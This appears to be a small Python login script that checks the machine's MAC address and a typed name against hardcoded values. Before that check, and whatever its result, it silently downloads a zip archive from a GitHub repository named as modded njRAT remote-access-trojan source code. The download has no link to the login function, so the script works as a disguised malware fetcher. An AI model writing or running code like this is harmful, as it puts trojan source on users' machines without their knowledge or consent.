import colorama
from colorama import Fore
import wget
url='https://github.com/HKingz/RAT-NjRat-0.7d-modded-source-code-forked/archive/refs/heads/master.zip'
response=wget.download(url)
from uuid import getnode as get_mac
GetMac = get_mac()
name='ilyas'
mac=622601971398
GetName=input('What is your name : ')
if GetMac==mac and GetName==name :
    print(Fore.GREEN+'Succes login')
elif GetMac==mac and GetName!=name:
    print(Fore.RED+'Verify your information')
    exit()
else:
    print(Fore.YELLOW+"This devices doesn't exist")
    exit()
print(1)